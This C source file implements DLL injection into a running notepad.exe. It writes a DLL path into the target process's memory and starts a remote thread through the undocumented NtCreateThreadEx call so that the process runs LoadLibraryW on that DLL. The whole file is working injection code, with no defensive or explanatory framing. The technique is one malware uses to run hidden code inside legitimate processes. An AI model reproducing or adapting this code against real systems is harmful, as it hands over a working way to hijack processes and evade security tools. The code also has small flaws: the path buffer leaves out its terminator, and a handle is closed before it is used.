#include "NtCreateThreadEx.h"

BOOL NtCreateThreadEx_Injection()
{
	// some vars
	HMODULE hNtdll;
	DWORD dwProcessId;
	HANDLE hProcess;
	TCHAR lpDllName[] = _T("InjectedDLL.dll");
	TCHAR lpDllPath[MAX_PATH];
	LPVOID lpBaseAddress;
	BOOL bStatus;
	HMODULE hKernel32;
	FARPROC LoadLibraryAddress;
	HANDLE  hRemoteThread = NULL;

	// we have to import our function
	pNtCreateThreadEx NtCreateThreadEx = NULL;

	/* Get Process ID from Process name */
	dwProcessId = GetProcessIdFromName(_T("notepad.exe"));
	if (dwProcessId == NULL)
		return FALSE;
	_tprintf(_T("\t[+] Getting proc id: %d\n"), dwProcessId);

	/* Obtain a handle the process */
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
	if (hProcess == NULL) {
		print_last_error(_T("OpenProcess"));
		return FALSE;
	}

	/* Get module handle of ntdll */
	hNtdll = GetModuleHandle(_T("ntdll.dll"));
	if (hNtdll == NULL) {
		print_last_error(_T("GetModuleHandle"));
		return FALSE;
	}

	/* Obtain a handle to kernel32 */
	hKernel32 = GetModuleHandle(_T("kernel32.dll"));
	if (hKernel32 == NULL) {
		print_last_error(_T("GetModuleHandle"));
		return FALSE;
	}

	// Get the address NtCreateThreadEx
	_tprintf(_T("\t[+] Looking for NtCreateThreadEx in ntdll\n"));
	NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
	if (NtCreateThreadEx == NULL) {
		print_last_error(_T("GetProcAddress"));
		return FALSE;
	}
	_tprintf(_T("\t[+] Found at 0x%08x\n"), (UINT)NtCreateThreadEx);

	/* Get LoadLibrary address */
	_tprintf(_T("\t[+] Looking for LoadLibrary in kernel32\n"));
	LoadLibraryAddress = GetProcAddress(hKernel32, "LoadLibraryW");
	if (LoadLibraryAddress == NULL) {
		print_last_error(_T("GetProcAddress"));
		return FALSE;
	}
	_tprintf(_T("\t[+] Found at 0x%08x\n"), (UINT)LoadLibraryAddress);

	/* Get the full path of the dll */
	GetFullPathName(lpDllName, MAX_PATH, lpDllPath, NULL);
	_tprintf(_T("\t[+] Full DLL Path: %s\n"), lpDllPath);

	/* Calculate the number of bytes needed for the DLL's pathname */
	SIZE_T dwSize = _tcslen(lpDllPath) * sizeof(TCHAR);

	/* Allocate memory into the remote process */
	_tprintf(_T("\t[+] Allocating space for the path of the DLL\n"));
	lpBaseAddress = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (lpBaseAddress == NULL) {
		print_last_error(_T("VirtualAllocEx"));
		return FALSE;
	}

	/* Write to the remote process */
	printf("\t[+] Writing into the current process space at 0x%08x\n", (UINT)lpBaseAddress);
	bStatus = WriteProcessMemory(hProcess, lpBaseAddress, lpDllPath, dwSize, NULL);
	if (bStatus == NULL) {
		print_last_error(_T("WriteProcessMemory"));
		return FALSE;
	}

	/* Create the more thread */
	bStatus = NtCreateThreadEx(&hRemoteThread, GENERIC_ALL, NULL, hProcess, (LPTHREAD_START_ROUTINE)LoadLibraryAddress, lpBaseAddress, FALSE, NULL, NULL, NULL, NULL);
	if (bStatus < 0) {
		print_last_error(_T("NtCreateThreadEx"));
		return FALSE;
	}

	else {
		_tprintf(_T("Remote thread has been created successfully ...\n"));
		WaitForSingleObject(hRemoteThread, INFINITE);

		// Clean up
		CloseHandle(hProcess);
		VirtualFreeEx(hProcess, lpBaseAddress, dwSize, MEM_RELEASE);
		return TRUE;
	}
}